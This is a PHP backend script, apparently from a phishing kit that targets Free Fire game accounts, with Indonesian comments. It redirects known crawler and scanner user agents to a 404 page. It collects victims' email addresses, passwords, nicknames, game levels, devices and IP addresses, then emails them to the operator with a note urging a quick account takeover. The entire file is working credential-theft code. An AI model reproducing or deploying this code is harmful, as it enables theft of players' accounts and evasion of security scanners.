<?php
error_reporting(0);
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('http://idhaampedia.me/404.php');
die();
}
/** START SEND RESULT TO GMAIL **/
if(isset($_POST['login'])) /** JIKA BUTTON LOGIN TERSUBMIT DENGAN METODE POST **/ {
    $email = $_POST['email']; /** MENERIMA EMAIL **/
    $pass  = $_POST['password']; /** MENERIMA PASSWORD **/
    $nick  = $_POST['nick'];
    $lvl   = $_POST['lvl'];
    $pas2  = $_POST['n'];
    $log   = $_POST['provider'];
    $dev   = $_POST['device'];
    $ip    = $_SERVER['REMOTE_ADDR'];
    include"sendto.php"; /** MENGAMBIL EMAIL **/
    if(!empty($email) || !empty($pass)) /** JIKA SEMUA DATA TERISI **/ { 
        $body = <<<EOD
            <html><head><style>table, td, th {border: 2px solid green;text-align: center;}table{border-collapse: collapse;width: 100%;}th, td {padding: 8px;}tr:hover{background-color:#f5f5f5}</style></head>
            <body><table><tr><td>RESULT FF LOG $log</b></td></tr><tr><td>CEPET AMANIN BOSS, KEBURU DIGANTI SAMA YANG PUNYA!!!!</td></tr></table><br>
            <table><tr><th>Email</th><th>Password</th><th>Nickname</th><th>Level</th><th>EP Season</th><th>Device</th><th>IP Address</th></tr><tr><td>$email</td><td>$pass</td><td>$nick</td><td>$lvl</td><td>$pas2</td><td>$dev</td><td>$ip</td></tr></table><br></body></html>
EOD;
        $subjek = 'AKUN FF PUNYA '.$nick.'';
        $headers = "From: IdhaamPedia@hentai.com\r\n";
        $headers .= "Content-type: text/html\r\n";
        $success = mail($mailto, $subjek, $body, $headers);

        if($success) {
            session_start();
            $_SESSION['log'] = "Idhaampedia";
            $_SESSION['nick'] = $nick;
            echo "<script>document.location='berhasil.php';</script>";
        }
    }
}
?>